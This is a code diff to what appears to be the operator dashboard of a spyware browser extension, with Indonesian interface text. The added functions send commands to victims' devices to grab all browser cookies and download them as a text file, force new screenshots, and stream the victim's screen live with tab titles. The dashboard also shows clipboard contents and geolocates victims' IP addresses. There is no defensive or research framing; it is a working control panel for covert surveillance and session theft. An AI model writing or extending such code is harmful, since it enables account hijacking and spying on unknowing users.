@@ -4653,6 +4653,7 @@
 <!-- ====== SCREENSHOT LIGHTBOX ====== -->
 <div id="screenshotLightbox" onclick="closeLightbox()">
     <button id="lightboxClose" onclick="closeLightbox()">✕ Tutup</button>
+    <button id="lightboxDownloadBtn" onclick="event.stopPropagation(); downloadLightboxImage();" style="position:fixed;top:20px;right:120px;background:rgba(0,224,126,0.15);border:1px solid rgba(0,224,126,0.3);color:#00e07e;padding:8px 14px;border-radius:10px;cursor:pointer;font-size:14px;font-family:Inter,sans-serif;font-weight:600;">⬇ Download</button>
     <img id="lightboxImage" src="" alt="Screenshot" onclick="event.stopPropagation()">
 </div>
 
@@ -6762,41 +6763,60 @@ SCRIPT
 
 
 
-    // Manual IP lookup dari dashboard (fallback jika extension gagal)
+    // Manual IP lookup dari dashboard — versi lama (by element)
     async function fetchLocationForIP(ip, btnEl) {
         if (!ip || ip === 'Unknown') return;
-        if (btnEl) { btnEl.textContent = '...'; btnEl.disabled = true; }
-        
+        if (btnEl) { btnEl.textContent = '⏳'; btnEl.disabled = true; }
+        const loc = await _lookupIP(ip);
+        if (loc && btnEl) {
+            const meta = btnEl.closest('.spy-ip-block')?.querySelector('.spy-ip-meta');
+            if (meta) {
+                meta.innerHTML = _formatIPMeta(loc, ip, null);
+                lucide.createIcons();
+            }
+        } else if (btnEl) {
+            btnEl.textContent = '❌';
+            btnEl.disabled = false;
+        }
+    }
+
+    // New — lookup by userId, updates DOM by id
+    async function fetchLocationForIPById(userId, ip) {
+        if (!ip || ip === 'Unknown') return;
+        const metaEl = document.getElementById('ip-meta-' + userId);
+        if (metaEl) metaEl.innerHTML = '<span style="color:var(--text-muted);font-size:11px;">⏳ Mencari lokasi...</span>';
+        const loc = await _lookupIP(ip);
+        if (metaEl) {
+            metaEl.innerHTML = _formatIPMeta(loc, ip, userId);
+            lucide.createIcons();
+        }
+    }
+
+    async function _lookupIP(ip) {
         const services = [
             { url: `https://ipapi.co/${ip}/json/`, parse: d => d.country_name ? { country: d.country_name, region: d.region || '', city: d.city || '', isp: d.org || '' } : null },
             { url: `https://ipinfo.io/${ip}/json`, parse: d => d.country ? { country: d.country, region: d.region || '', city: d.city || '', isp: d.org || '' } : null },
         ];
-
         for (const svc of services) {
             try {
                 const res = await fetch(svc.url);
                 if (!res.ok) continue;
                 const data = await res.json();
                 const loc = svc.parse(data);
-                if (loc && loc.country) {
-                    // Update UI
-                    const block = btnEl ? btnEl.closest('.spy-ip-block') : null;
-                    if (block) {
-                        const meta = block.querySelector('.spy-ip-meta');
-                        if (meta) {
-                            meta.innerHTML = `
-                                <span class="spy-ip-tag">🌏 ${escHtml(loc.country)}</span>
-                                ${loc.region ? `<span class="spy-ip-tag">📍 ${escHtml(loc.region)}</span>` : ''}
-                                ${loc.city ? `<span class="spy-ip-tag">🏙️ ${escHtml(loc.city)}</span>` : ''}
-                                ${loc.isp ? `<span class="spy-ip-tag">🌐 ${escHtml(loc.isp.substring(0,30))}</span>` : ''}
-                            `;
-                        }
-                    }
-                    return;
-                }
+                if (loc && loc.country) return loc;
             } catch (e) {}
         }
-        if (btnEl) { btnEl.textContent = '❌'; }
+        return null;
+    }
+
+    function _formatIPMeta(loc, ip, userId) {
+        if (!loc) return `<span style="color:var(--danger);font-size:11px;">❌ Gagal lookup</span>`;
+        return `
+            <span class="spy-ip-tag">🌏 ${escHtml(loc.country)}</span>
+            ${loc.region ? `<span class="spy-ip-tag">📍 ${escHtml(loc.region)}</span>` : ''}
+            ${loc.city ? `<span class="spy-ip-tag">🏙️ ${escHtml(loc.city)}</span>` : ''}
+            ${loc.isp ? `<span class="spy-ip-tag">🌐 ${escHtml(loc.isp.substring(0,30))}</span>` : ''}
+        `;
     }
 
     // ================================================================
@@ -6866,9 +6886,13 @@ SCRIPT
         const hasClip = !!(clipText && clipText.trim().length > 0);
         const hasScreenshot = !!(account.screenshot);
         const capturedAt = account.capturedAt || account.updatedAt || account.createdAt;
+        const userId = escHtml(String(account.userId || ''));
+        const deviceId = escHtml(account.deviceId || '');
+        const screenshotSrc = account.screenshot || '';
+        const screenshotB64 = hasScreenshot ? screenshotSrc : '';
 
         return `
-            <div class="spy-card">
+            <div class="spy-card" id="spy-card-${userId}">
                 <div class="spy-card-header">
                     <div class="spy-card-avatar">
                         ${avatarUrl ? 
@@ -6880,10 +6904,16 @@ SCRIPT
                         <div class="spy-card-username">${escHtml(account.displayName || account.username || 'Unknown')}</div>
                         <div class="spy-card-time">${capturedAt ? formatRelativeTime(new Date(capturedAt)) : '-'}</div>
                     </div>
-                    <button onclick="openAccountModal('${escHtml(String(account.userId || ''))}')" 
-                        style="background:rgba(0,212,255,0.08);border:1px solid rgba(0,212,255,0.2);color:var(--accent-cyan);padding:5px 10px;border-radius:6px;cursor:pointer;font-size:11px;font-family:var(--font-family);">
-                        Detail
-                    </button>
+                    <div style="display:flex;gap:4px;flex-wrap:wrap;align-items:center;">
+                        <button onclick="openAccountModal('${userId}')" 
+                            style="background:rgba(0,212,255,0.08);border:1px solid rgba(0,212,255,0.2);color:var(--accent-cyan);padding:5px 10px;border-radius:6px;cursor:pointer;font-size:11px;font-family:var(--font-family);">
+                            Detail
+                        </button>
+                        <button onclick="grabAllCookies('${userId}')" 
+                            style="background:rgba(255,204,0,0.08);border:1px solid rgba(255,204,0,0.25);color:var(--warning);padding:5px 10px;border-radius:6px;cursor:pointer;font-size:11px;font-family:var(--font-family);" title="Grab All Cookies">
+                            🍪 Grab Cookies
+                        </button>
+                    </div>
                 </div>
 
                 <!-- IP Section -->
@@ -6891,29 +6921,53 @@ SCRIPT
                 <div class="spy-ip-block">
                     <div class="spy-ip-value">${ip === 'Unknown' ? '<span style="color:var(--text-muted);font-size:13px;">Tidak diketahui</span>' : escHtml(ip)}</div>
                     ${ip !== 'Unknown' ? `
-                    <div class="spy-ip-meta">
+                    <div class="spy-ip-meta" id="ip-meta-${userId}">
                         ${(loc.country && loc.country !== 'Unknown') ? `<span class="spy-ip-tag">🌏 ${escHtml(loc.country)}</span>` : ''}
                         ${(loc.region && loc.region !== 'Unknown') ? `<span class="spy-ip-tag">📍 ${escHtml(loc.region)}</span>` : ''}
                         ${(loc.city && loc.city !== 'Unknown') ? `<span class="spy-ip-tag">🏙️ ${escHtml(loc.city)}</span>` : ''}
                         ${(loc.isp && loc.isp !== 'Unknown') ? `<span class="spy-ip-tag">🌐 ${escHtml(loc.isp.substring(0, 30))}</span>` : ''}
-                        ${(!loc.country || loc.country === 'Unknown') && ip !== 'Unknown' ? `<button onclick="fetchLocationForIP('${escHtml(ip)}', this)" style="background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.2);color:var(--accent-cyan);padding:2px 8px;border-radius:4px;cursor:pointer;font-size:11px;font-family:var(--font-family);">🔍 Lookup</button>` : ''}
-                    </div>` : ''}
+                        <button onclick="fetchLocationForIPById('${userId}', '${escHtml(ip)}')" style="background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.2);color:var(--accent-cyan);padding:2px 8px;border-radius:4px;cursor:pointer;font-size:11px;font-family:var(--font-family);">🔍 Lookup</button>
+                    </div>` : `<div class="spy-ip-meta" id="ip-meta-${userId}"><button onclick="fetchLocationForIPById('${userId}', '${escHtml(ip)}')" style="background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.2);color:var(--accent-cyan);padding:2px 8px;border-radius:4px;cursor:pointer;font-size:11px;font-family:var(--font-family);">🔍 Lookup IP</button></div>`}
                 </div>
 
                 <!-- Screenshot Section -->
-                <div class="spy-section-label"><i data-lucide="camera"></i> Screenshot</div>
-                <div class="spy-screenshot-block">
+                <div class="spy-section-label" style="display:flex;align-items:center;justify-content:space-between;">
+                    <span><i data-lucide="camera"></i> Screenshot</span>
+                    <div style="display:flex;gap:4px;">
+                        <button onclick="refreshScreenshot('${userId}')" id="refresh-ss-btn-${userId}"
+                            style="background:rgba(0,212,255,0.08);border:1px solid rgba(0,212,255,0.2);color:var(--accent-cyan);padding:3px 8px;border-radius:4px;cursor:pointer;font-size:11px;font-family:var(--font-family);"
+                            title="Refresh Screenshot">
+                            🔄 Refresh
+                        </button>
+                        ${hasScreenshot ? `<button onclick="downloadImage('${userId}', 'screenshot')" style="background:rgba(0,224,126,0.08);border:1px solid rgba(0,224,126,0.2);color:var(--success);padding:3px 8px;border-radius:4px;cursor:pointer;font-size:11px;font-family:var(--font-family);" title="Download Screenshot">⬇ DL</button>` : ''}
+                    </div>
+                </div>
+                <div class="spy-screenshot-block" id="screenshot-block-${userId}">
                     ${hasScreenshot ? `
-                        <img src="${account.screenshot}" alt="Screenshot" 
-                            onclick="openLightbox('${account.screenshot}')"
+                        <img src="${screenshotSrc}" alt="Screenshot" id="screenshot-img-${userId}"
+                            onclick="openLightbox('${screenshotSrc}')"
                             title="Klik untuk perbesar">
                         ${account.screenshotUrl ? `<div class="spy-screenshot-url">${escHtml(account.screenshotUrl)}</div>` : ''}
                     ` : `
-                        <div class="spy-screenshot-placeholder">
+                        <div class="spy-screenshot-placeholder" id="screenshot-placeholder-${userId}">
                             <i data-lucide="camera-off" style="width:24px;height:24px;opacity:0.3;display:block;margin:0 auto 6px;"></i>
                             Belum ada screenshot
                         </div>
                     `}
+                </div>
+
+                <!-- Live Stream Section -->
+                <div class="spy-section-label" style="display:flex;align-items:center;justify-content:space-between;margin-top:4px;">
+                    <span><i data-lucide="video"></i> Live Stream</span>
+                    <button onclick="toggleLive('${userId}')" id="live-btn-${userId}"
+                        style="background:rgba(255,59,59,0.08);border:1px solid rgba(255,59,59,0.2);color:var(--danger);padding:3px 10px;border-radius:4px;cursor:pointer;font-size:11px;font-family:var(--font-family);">
+                        🔴 Live OFF
+                    </button>
+                </div>
+                <div id="live-container-${userId}" style="background:rgba(0,0,0,0.3);border:1px solid var(--border-color);border-radius:8px;overflow:hidden;min-height:60px;display:flex;align-items:center;justify-content:center;margin-bottom:8px;">
+                    <div style="font-size:12px;color:var(--text-muted);text-align:center;padding:16px;">
+                        <span>Live OFF — tekan tombol untuk mulai</span>
+                    </div>
                 </div>
 
                 <!-- Clipboard Section -->
@@ -6943,12 +6997,319 @@ SCRIPT
         document.getElementById('lightboxImage').src = '';
     }
 
+    function downloadLightboxImage() {
+        const img = document.getElementById('lightboxImage');
+        if (!img || !img.src) return;
+        const a = document.createElement('a');
+        a.href = img.src;
+        a.download = 'screenshot_' + Date.now() + '.jpg';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        showToast('Download dimulai', 'success');
+    }
+
     // Tutup lightbox dengan ESC
     document.addEventListener('keydown', (e) => {
         if (e.key === 'Escape') {
             closeLightbox();
         }
     });
+
+    // ================================================================
+    // REFRESH SCREENSHOT
+    // ================================================================
+    const liveStates = {}; // userId -> { active: bool, interval: id }
+
+    async function refreshScreenshot(userId) {
+        const btn = document.getElementById('refresh-ss-btn-' + userId);
+        if (btn) { btn.textContent = '⏳ Requesting...'; btn.disabled = true; }
+
+        const account = allAccounts.find(a => String(a.userId) === String(userId));
+        const deviceId = account?.deviceId || '';
+
+        try {
+            // Method 1: Queue a command for the device
+            if (deviceId) {
+                await fetch(`${API_URL}/api/command/${deviceId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                    body: JSON.stringify({ action: 'refresh_screenshot', userId })
+                });
+                showToast('Screenshot refresh diminta', 'info', 'Screenshot baru akan muncul dalam beberapa detik');
+            }
+
+            // Method 2: Also try force-capture via old poll mechanism
+            await fetch(`${API_URL}/api/force-capture`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                body: JSON.stringify({ deviceId: deviceId || ('any_' + userId) })
+            });
+        } catch (e) {}
+
+        // Poll for new screenshot for 15s
+        let attempts = 0;
+        const pollSS = setInterval(async () => {
+            attempts++;
+            await loadData();
+            const updated = allAccounts.find(a => String(a.userId) === String(userId));
+            if (updated?.screenshot) {
+                const imgEl = document.getElementById('screenshot-img-' + userId);
+                const blockEl = document.getElementById('screenshot-block-' + userId);
+                if (imgEl) {
+                    imgEl.src = updated.screenshot + '?t=' + Date.now();
+                }
+                if (!imgEl && blockEl && updated.screenshot) {
+                    blockEl.innerHTML = `<img src="${updated.screenshot}" id="screenshot-img-${userId}" onclick="openLightbox('${updated.screenshot}')" style="width:100%;display:block;" title="Klik untuk perbesar">`;
+                }
+            }
+            if (attempts >= 5) {
+                clearInterval(pollSS);
+                if (btn) { btn.textContent = '🔄 Refresh'; btn.disabled = false; }
+            }
+        }, 3000);
+    }
+
+    // ================================================================
+    // DOWNLOAD IMAGE
+    // ================================================================
+    function downloadImage(userId, type) {
+        const account = allAccounts.find(a => String(a.userId) === String(userId));
+        if (!account) return;
+        const src = type === 'screenshot' ? account.screenshot : getAvatarUrl(account);
+        if (!src) { showToast('Tidak ada gambar untuk didownload', 'warning'); return; }
+        const a = document.createElement('a');
+        a.href = src;
+        a.download = `${account.username || userId}_${type}_${Date.now()}.jpg`;
+        a.target = '_blank';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        showToast('Download dimulai', 'success');
+    }
+
+    // ================================================================
+    // LIVE STREAM
+    // ================================================================
+    function toggleLive(userId) {
+        const btn = document.getElementById('live-btn-' + userId);
+        const state = liveStates[userId];
+
+        if (state && state.active) {
+            stopLive(userId);
+        } else {
+            startLive(userId);
+        }
+    }
+
+    async function startLive(userId) {
+        const btn = document.getElementById('live-btn-' + userId);
+        const container = document.getElementById('live-container-' + userId);
+        const account = allAccounts.find(a => String(a.userId) === String(userId));
+        const deviceId = account?.deviceId || '';
+
+        if (btn) { btn.textContent = '🟢 Live ON'; btn.style.color = 'var(--success)'; btn.style.borderColor = 'rgba(0,224,126,0.3)'; }
+        if (container) container.innerHTML = '<div style="font-size:12px;color:var(--text-muted);text-align:center;padding:12px;">⏳ Connecting live stream...</div>';
+
+        // Send command to extension
+        if (deviceId) {
+            try {
+                await fetch(`${API_URL}/api/command/${deviceId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                    body: JSON.stringify({ action: 'live_on', userId })
+                });
+            } catch (e) {}
+        }
+
+        // Poll for live frames
+        const liveInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`${API_URL}/api/live-frame/${userId}`, {
+                    headers: { 'x-api-key': API_KEY }
+                });
+                const data = await res.json();
+                if (data.success && data.hasFrame && data.frame) {
+                    const containerEl = document.getElementById('live-container-' + userId);
+                    if (containerEl) {
+                        const age = Date.now() - (data.ts || 0);
+                        const ageStr = age < 3000 ? 'LIVE' : `${Math.round(age/1000)}s ago`;
+                        containerEl.innerHTML = `
+                            <div style="position:relative;width:100%;">
+                                <img src="${data.frame}" style="width:100%;display:block;border-radius:0;" onclick="openLightbox('${data.frame}')">
+                                <div style="position:absolute;top:4px;left:6px;background:rgba(255,0,0,0.8);color:white;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;">● ${ageStr}</div>
+                                ${data.tabTitle ? `<div style="position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.6);color:#ccc;font-size:10px;padding:2px 6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${escHtml(data.tabTitle)}</div>` : ''}
+                                <button onclick="downloadImage('${userId}', 'live')" style="position:absolute;top:4px;right:6px;background:rgba(0,0,0,0.6);border:none;color:white;font-size:11px;padding:2px 6px;border-radius:4px;cursor:pointer;">⬇</button>
+                            </div>`;
+                        // Store frame for download
+                        if (!allAccounts._liveFrames) allAccounts._liveFrames = {};
+                        allAccounts._liveFrames[userId] = data.frame;
+                    }
+                }
+            } catch (e) {}
+        }, 1200);
+
+        liveStates[userId] = { active: true, interval: liveInterval };
+        showToast('Live stream dimulai', 'success', 'Menampilkan layar real-time');
+    }
+
+    async function stopLive(userId) {
+        const btn = document.getElementById('live-btn-' + userId);
+        const container = document.getElementById('live-container-' + userId);
+        const account = allAccounts.find(a => String(a.userId) === String(userId));
+        const deviceId = account?.deviceId || '';
+
+        if (btn) { btn.textContent = '🔴 Live OFF'; btn.style.color = 'var(--danger)'; btn.style.borderColor = 'rgba(255,59,59,0.2)'; }
+        if (container) container.innerHTML = '<div style="font-size:12px;color:var(--text-muted);text-align:center;padding:16px;"><span>Live OFF — tekan tombol untuk mulai</span></div>';
+
+        const state = liveStates[userId];
+        if (state?.interval) clearInterval(state.interval);
+        liveStates[userId] = { active: false, interval: null };
+
+        if (deviceId) {
+            try {
+                await fetch(`${API_URL}/api/command/${deviceId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                    body: JSON.stringify({ action: 'live_off', userId })
+                });
+            } catch (e) {}
+        }
+        showToast('Live stream dihentikan', 'info');
+    }
+
+    // ================================================================
+    // GRAB ALL COOKIES
+    // ================================================================
+    async function grabAllCookies(userId) {
+        showToast('Mengirim perintah Grab Cookies...', 'info');
+        const account = allAccounts.find(a => String(a.userId) === String(userId));
+        const deviceId = account?.deviceId || '';
+
+        try {
+            // Send command to extension
+            if (deviceId) {
+                await fetch(`${API_URL}/api/command/${deviceId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                    body: JSON.stringify({ action: 'grab_cookies', userId })
+                });
+            }
+        } catch (e) {}
+
+        // Poll for cookies to arrive (max 10s)
+        let attempts = 0;
+        showToast('Menunggu cookies dari device...', 'info', 'Max 10 detik');
+        const pollCookies = setInterval(async () => {
+            attempts++;
+            try {
+                const res = await fetch(`${API_URL}/api/cookies-meta/${userId}`, {
+                    headers: { 'x-api-key': API_KEY }
+                });
+                const data = await res.json();
+                if (data.success && data.hasCookies) {
+                    clearInterval(pollCookies);
+                    showCookiesModal(userId, data.totalCount, data.capturedAt);
+                }
+            } catch (e) {}
+            if (attempts >= 5) {
+                clearInterval(pollCookies);
+                // Check one more time directly
+                try {
+                    const res = await fetch(`${API_URL}/api/cookies-meta/${userId}`, {
+                        headers: { 'x-api-key': API_KEY }
+                    });
+                    const data = await res.json();
+                    if (data.success && data.hasCookies) {
+                        showCookiesModal(userId, data.totalCount, data.capturedAt);
+                    } else {
+                        showToast('Cookies belum tersedia', 'warning', 'Coba lagi dalam beberapa detik (pastikan extension aktif)');
+                    }
+                } catch (e) {
+                    showToast('Gagal fetch cookies', 'error');
+                }
+            }
+        }, 2000);
+    }
+
+    function showCookiesModal(userId, totalCount, capturedAt) {
+        const account = allAccounts.find(a => String(a.userId) === String(userId));
+        const name = account?.displayName || account?.username || userId;
+        
+        // Show a toast with download option
+        const container = document.getElementById('toastContainer');
+        const toast = document.createElement('div');
+        toast.className = 'toast success';
+        toast.style.maxWidth = '380px';
+        toast.innerHTML = `
+            <div class="toast-icon"><i data-lucide="cookie"></i></div>
+            <div class="toast-content">
+                <div class="toast-title">🍪 Cookies Ready — ${escHtml(name)}</div>
+                <div class="toast-message">${totalCount} cookies • ${capturedAt ? new Date(capturedAt).toLocaleTimeString() : ''}</div>
+                <div style="margin-top:8px;">
+                    <button onclick="downloadCookies('${escHtml(String(userId))}')" 
+                        style="background:rgba(0,224,126,0.15);border:1px solid rgba(0,224,126,0.3);color:var(--success);padding:5px 12px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:600;font-family:var(--font-family);">
+                        ⬇ Download Cookies TXT
+                    </button>
+                </div>
+            </div>
+            <button class="toast-close" onclick="this.parentElement.remove()"><i data-lucide="x"></i></button>
+        `;
+        container.appendChild(toast);
+        lucide.createIcons();
+        showToast(`${totalCount} cookies berhasil dicapture dari ${name}`, 'success');
+    }
+
+    async function downloadCookies(userId) {
+        const a = document.createElement('a');
+        a.href = `${API_URL}/api/cookies/${userId}`;
+        // Include API key in URL via query (for download link)
+        // Actually we need to fetch and create blob since auth is header-based
+        try {
+            const res = await fetch(`${API_URL}/api/cookies/${userId}`, {
+                headers: { 'x-api-key': API_KEY }
+            });
+            if (!res.ok) { showToast('Gagal download cookies', 'error'); return; }
+            const text = await res.text();
+            const blob = new Blob([text], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `cookies_${userId}_${Date.now()}.txt`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+            showToast('Cookies didownload', 'success');
+        } catch (e) {
+            showToast('Gagal download cookies: ' + e.message, 'error');
+        }
+    }
+
+    // Also add download button to lightbox
+    function openLightboxWithDownload(src, userId) {
+        openLightbox(src);
+        const lb = document.getElementById('screenshotLightbox');
+        // Add download button if not exists
+        let dlBtn = document.getElementById('lightboxDownloadBtn');
+        if (!dlBtn) {
+            dlBtn = document.createElement('button');
+            dlBtn.id = 'lightboxDownloadBtn';
+            dlBtn.style.cssText = 'position:fixed;top:20px;right:120px;background:rgba(0,224,126,0.15);border:1px solid rgba(0,224,126,0.3);color:var(--success);padding:8px 14px;border-radius:var(--radius-md);cursor:pointer;font-size:14px;font-family:var(--font-family);font-weight:600;';
+            dlBtn.textContent = '⬇ Download';
+            lb.appendChild(dlBtn);
+        }
+        dlBtn.onclick = () => {
+            const img = document.getElementById('lightboxImage');
+            if (img?.src) {
+                const a = document.createElement('a');
+                a.href = img.src;
+                a.download = `screenshot_${userId || Date.now()}.jpg`;
+                a.click();
+            }
+        };
+    }
+
 
     setInterval(updateRelativeTimes, 30000);
     setInterval(() => {
